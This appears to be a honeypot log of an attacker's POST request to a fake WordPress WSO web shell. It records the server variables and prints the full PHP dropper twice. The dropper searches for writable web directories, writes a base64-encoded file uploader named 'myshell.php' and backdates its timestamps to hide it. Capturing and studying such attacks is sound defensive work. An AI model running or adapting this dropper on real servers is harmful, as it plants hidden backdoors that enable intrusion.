
_SERVER
Array
(
    [UNIQUE_ID] => WqmapWEzFg7vKH1WJOfZuwAAAAE
    [SCRIPT_URL] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_URI] => http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [HTTP_HOST] => stratigery.com
    [HTTP_CONNECTION] => close
    [HTTP_ACCEPT_ENCODING] => gzip,deflate
    [CONTENT_TYPE] => application/x-www-form-urlencoded
    [CONTENT_LENGTH] => 4842
    [HTTP_USER_AGENT] => Mozilla/5.0 (Windows NT 6.1; rv:21.0) Gecko/20130331 Firefox/21.0
    [HTTP_COOKIE] => d8670190bc460b6abebf276d20db5892=866fd58d77526c1bda8771b5b21d5b11
    [PATH] => /usr/local/sbin:/usr/local/bin:/usr/bin
    [SERVER_SIGNATURE] => 
    [SERVER_SOFTWARE] => Apache/2.4.29 (Unix) PHP/7.2.3
    [SERVER_NAME] => stratigery.com
    [SERVER_ADDR] => 162.246.45.144
    [SERVER_PORT] => 80
    [REMOTE_ADDR] => 195.154.220.30
    [DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [REQUEST_SCHEME] => http
    [CONTEXT_PREFIX] => 
    [CONTEXT_DOCUMENT_ROOT] => /srv/http/stratigery/htdocs
    [SERVER_ADMIN] => bediger@stratigery.com
    [SCRIPT_FILENAME] => /srv/http/stratigery/htdocs/fake_wp/wso.php
    [REMOTE_PORT] => 55548
    [GATEWAY_INTERFACE] => CGI/1.1
    [SERVER_PROTOCOL] => HTTP/1.1
    [REQUEST_METHOD] => POST
    [QUERY_STRING] => 
    [REQUEST_URI] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [SCRIPT_NAME] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [PHP_SELF] => /wordpress/wp-content/plugins/revslider/temp/update_extract/revslider/db.php
    [REQUEST_TIME_FLOAT] => 1521064613.352
    [REQUEST_TIME] => 1521064613
)

_REQUEST
Array
(
    [a] => Php
    [p1] => error_reporting(0);
set_time_limit(0);
$startDirectory = '/srv/http';
$depth = 5;
$fileData = 'PD9waHANCg0KZXJyb3JfcmVwb3J0aW5nKDApOw0KDQpmdW5jdGlvbiBkKCRtc2cpDQp7DQoJZGll
KHN1YnN0cihtZDUobWljcm90aW1lKCkpLCByYW5kKDAsMjYpLCA1KS4kbXNnKTsNCn0NCg0KJGRh
dGEgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsNCg0KaWYgKHN0cmxlbigkZGF0
YSkgPD0gNCkgZCgnZTAnKTsNCg0KJGRhdGEgPSBzdWJzdHIoJGRhdGEsIDMpOw0KJGRhdGEgPSBi
YXNlNjRfZGVjb2RlKCRkYXRhKTsNCiRjID0gJ1BIUDUnOw0KaWYgKHN1YnN0cigkZGF0YSwgLXN0
cmxlbigkYykpICE9PSAkYykgZCgnZTEnKTsNCiRkYXRhID0gc3Vic3RyKCRkYXRhLCAwLCAtc3Ry
bGVuKCRjKSk7DQoNCiRwID0gc3RycG9zKCRkYXRhLCAnOycpOyBpZiAoJHAgPT09IGZhbHNlKSBk
KCdlMicpOw0KJGRhdGEgPSBzdWJzdHIoJGRhdGEsICRwKzEpOw0KDQokcCA9IHN0cnBvcygkZGF0
YSwgJzsnKTsgaWYgKCRwID09PSBmYWxzZSkgZCgnZTMnKTsNCiRmbmFtZSA9IHN1YnN0cigkZGF0
YSwgMCwgJHApOyAkZGF0YSA9IHN1YnN0cigkZGF0YSwgJHArMSk7DQppZiAoIXN0cmxlbigkZm5h
bWUpKSBkKCdlNScpOw0KDQokcCA9IHN0cnBvcygkZGF0YSwgJzsnKTsgaWYgKCRwID09PSBmYWxz
ZSkgZCgnZTQnKTsNCiR1cCA9IHN1YnN0cigkZGF0YSwgMCwgJHApOyAkZGF0YSA9IHN1YnN0cigk
ZGF0YSwgJHArMSk7DQoNCiR1cCA9IGludHZhbCgkdXApOw0KDQppZiAoJHVwID4gMCkNCnsNCgkk
ZGlyID0gX19ESVJfXzsNCglmb3IgKCRpID0gMDsgJGkgPCAkdXA7ICRpKyspICRkaXIgPSBkaXJu
YW1lKCRkaXIpOw0KCSRmbmFtZSA9IHJ0cmltKCRkaXIsIERJUkVDVE9SWV9TRVBBUkFUT1IpLkRJ
UkVDVE9SWV9TRVBBUkFUT1IuJGZuYW1lOw0KfQ0KDQpmb3IgKCRpID0gMDsgJGkgPCAyMDsgJGkr
KykNCnsNCglmaWxlX3B1dF9jb250ZW50cygkZm5hbWUsICRkYXRhLCBMT0NLX0VYKTsNCgkkb2sg
PSBmaWxlX2V4aXN0cygkZm5hbWUpOw0KCWlmICgkb2spIGJyZWFrOw0KfQ0KDQppZiAoJG9rKQ0K
ew0KCWQoJ29rJyk7DQp9IGVsc2UNCnsNCglkKCdiYWQ6Jy4kZm5hbWUuJ3wnLl9fRElSX18pOw0K
fQ0KDQo=';
$fileName = 'myshell.php';
$filePrefix = '';
$fileMode = 1;
function GetAllDirs($startPath) {
	$allDirs = array($startPath => 0);
	$rDir = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startPath), RecursiveIteratorIterator::CHILD_FIRST);
	$rgResult = array();
	foreach($rDir as $rPath) {
		if($rPath->isDir() && $rPath->isWritable() && !$rDir->isDot()) {
			$dirPath = str_replace('\\', '/', (string)$rPath);
                        if(!CheckHtaccess($dirPath.'/.htaccess'))
			    $allDirs[$dirPath] = substr_count(str_replace($startPath, '', $dirPath),'/');
		}
	}
	arsort($allDirs);
	return $allDirs;
}

function CheckHtaccess($htaccessPath) {
	$isDeny = false;
	if(file_exists($htaccessPath)) {
	$isDeny = true;
		if(is_readable($htaccessPath)) {
			$htaccessContent = strtolower(file_get_contents($htaccessPath));
			$searchContent = 'deny from';
			if (!strstr($htaccessContent, $searchContent)) {
				$isDeny = false;
			}
		}
	}
	return $isDeny;
}

function GetRandomPath($dirs, $depth) {
	if($depth > (int)current($dirs)) {
		$depth = (int)current($dirs);
	}
	$allKeys = array_keys($dirs, $depth);
	return $allKeys[rand(0, count($allKeys) - 1)];
}

function FileWrite($filePath, $fileData, $fileMode, $filePrefix) {
$pathParts = pathinfo($filePath);
$fileTime = filemtime($pathParts['dirname']);
	if(file_exists($filePath)) {
			if($fileMode == 2)
				return '';
			if($fileMode == 0)
				$filePath = $pathParts['dirname'].'/'.$filePrefix.$pathParts['basename'];
	}
	if($fp = fopen($filePath, 'w')) {
		fwrite($fp, $fileData);
		fclose($fp);
		touch($filePath, $fileTime);
		touch($pathParts['dirname'], $fileTime);
		return $filePath;
	}
}

$allDirs = GetAllDirs($startDirectory);
$randPath = GetRandomPath($allDirs, $depth);
$fileWritedPath = FileWrite($randPath.'/'.$fileName, base64_decode($fileData), $fileMode, $filePrefix);
if(strlen($fileWritedPath) != 0)
		if(strlen($_SERVER['DOCUMENT_ROOT']) == 1)
		    echo substr($fileWritedPath, 1);
	    else
		    echo str_replace(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '', $fileWritedPath);
)

_COOKIE
 Array
(
    [d8670190bc460b6abebf276d20db5892] => 866fd58d77526c1bda8771b5b21d5b11
)

_FILES
 
END _FILES
 $my_blog=http://stratigery.com/wordpress/wp-content/plugins/revslider/temp/update_extract/revslider
Acting as WSO, login cookie.
a = Php
p1 = error_reporting(0);
set_time_limit(0);
$startDirectory = '/srv/http';
$depth = 5;
$fileData = 'PD9waHANCg0KZXJyb3JfcmVwb3J0aW5nKDApOw0KDQpmdW5jdGlvbiBkKCRtc2cpDQp7DQoJZGll
KHN1YnN0cihtZDUobWljcm90aW1lKCkpLCByYW5kKDAsMjYpLCA1KS4kbXNnKTsNCn0NCg0KJGRh
dGEgPSBmaWxlX2dldF9jb250ZW50cygncGhwOi8vaW5wdXQnKTsNCg0KaWYgKHN0cmxlbigkZGF0
YSkgPD0gNCkgZCgnZTAnKTsNCg0KJGRhdGEgPSBzdWJzdHIoJGRhdGEsIDMpOw0KJGRhdGEgPSBi
YXNlNjRfZGVjb2RlKCRkYXRhKTsNCiRjID0gJ1BIUDUnOw0KaWYgKHN1YnN0cigkZGF0YSwgLXN0
cmxlbigkYykpICE9PSAkYykgZCgnZTEnKTsNCiRkYXRhID0gc3Vic3RyKCRkYXRhLCAwLCAtc3Ry
bGVuKCRjKSk7DQoNCiRwID0gc3RycG9zKCRkYXRhLCAnOycpOyBpZiAoJHAgPT09IGZhbHNlKSBk
KCdlMicpOw0KJGRhdGEgPSBzdWJzdHIoJGRhdGEsICRwKzEpOw0KDQokcCA9IHN0cnBvcygkZGF0
YSwgJzsnKTsgaWYgKCRwID09PSBmYWxzZSkgZCgnZTMnKTsNCiRmbmFtZSA9IHN1YnN0cigkZGF0
YSwgMCwgJHApOyAkZGF0YSA9IHN1YnN0cigkZGF0YSwgJHArMSk7DQppZiAoIXN0cmxlbigkZm5h
bWUpKSBkKCdlNScpOw0KDQokcCA9IHN0cnBvcygkZGF0YSwgJzsnKTsgaWYgKCRwID09PSBmYWxz
ZSkgZCgnZTQnKTsNCiR1cCA9IHN1YnN0cigkZGF0YSwgMCwgJHApOyAkZGF0YSA9IHN1YnN0cigk
ZGF0YSwgJHArMSk7DQoNCiR1cCA9IGludHZhbCgkdXApOw0KDQppZiAoJHVwID4gMCkNCnsNCgkk
ZGlyID0gX19ESVJfXzsNCglmb3IgKCRpID0gMDsgJGkgPCAkdXA7ICRpKyspICRkaXIgPSBkaXJu
YW1lKCRkaXIpOw0KCSRmbmFtZSA9IHJ0cmltKCRkaXIsIERJUkVDVE9SWV9TRVBBUkFUT1IpLkRJ
UkVDVE9SWV9TRVBBUkFUT1IuJGZuYW1lOw0KfQ0KDQpmb3IgKCRpID0gMDsgJGkgPCAyMDsgJGkr
KykNCnsNCglmaWxlX3B1dF9jb250ZW50cygkZm5hbWUsICRkYXRhLCBMT0NLX0VYKTsNCgkkb2sg
PSBmaWxlX2V4aXN0cygkZm5hbWUpOw0KCWlmICgkb2spIGJyZWFrOw0KfQ0KDQppZiAoJG9rKQ0K
ew0KCWQoJ29rJyk7DQp9IGVsc2UNCnsNCglkKCdiYWQ6Jy4kZm5hbWUuJ3wnLl9fRElSX18pOw0K
fQ0KDQo=';
$fileName = 'myshell.php';
$filePrefix = '';
$fileMode = 1;
function GetAllDirs($startPath) {
	$allDirs = array($startPath => 0);
	$rDir = new RecursiveIteratorIterator(new RecursiveDirectoryIterator($startPath), RecursiveIteratorIterator::CHILD_FIRST);
	$rgResult = array();
	foreach($rDir as $rPath) {
		if($rPath->isDir() && $rPath->isWritable() && !$rDir->isDot()) {
			$dirPath = str_replace('\\', '/', (string)$rPath);
                        if(!CheckHtaccess($dirPath.'/.htaccess'))
			    $allDirs[$dirPath] = substr_count(str_replace($startPath, '', $dirPath),'/');
		}
	}
	arsort($allDirs);
	return $allDirs;
}

function CheckHtaccess($htaccessPath) {
	$isDeny = false;
	if(file_exists($htaccessPath)) {
	$isDeny = true;
		if(is_readable($htaccessPath)) {
			$htaccessContent = strtolower(file_get_contents($htaccessPath));
			$searchContent = 'deny from';
			if (!strstr($htaccessContent, $searchContent)) {
				$isDeny = false;
			}
		}
	}
	return $isDeny;
}

function GetRandomPath($dirs, $depth) {
	if($depth > (int)current($dirs)) {
		$depth = (int)current($dirs);
	}
	$allKeys = array_keys($dirs, $depth);
	return $allKeys[rand(0, count($allKeys) - 1)];
}

function FileWrite($filePath, $fileData, $fileMode, $filePrefix) {
$pathParts = pathinfo($filePath);
$fileTime = filemtime($pathParts['dirname']);
	if(file_exists($filePath)) {
			if($fileMode == 2)
				return '';
			if($fileMode == 0)
				$filePath = $pathParts['dirname'].'/'.$filePrefix.$pathParts['basename'];
	}
	if($fp = fopen($filePath, 'w')) {
		fwrite($fp, $fileData);
		fclose($fp);
		touch($filePath, $fileTime);
		touch($pathParts['dirname'], $fileTime);
		return $filePath;
	}
}

$allDirs = GetAllDirs($startDirectory);
$randPath = GetRandomPath($allDirs, $depth);
$fileWritedPath = FileWrite($randPath.'/'.$fileName, base64_decode($fileData), $fileMode, $filePrefix);
if(strlen($fileWritedPath) != 0)
		if(strlen($_SERVER['DOCUMENT_ROOT']) == 1)
		    echo substr($fileWritedPath, 1);
	    else
		    echo str_replace(str_replace('\\', '/', $_SERVER['DOCUMENT_ROOT']), '', $fileWritedPath);
Acting as WSO PHP eval, recognized common dropper.
Uploaded file: /var/tmp/195.154.220.30WqmapWEzFg7vKH1WJOfZuwAAAAEfile
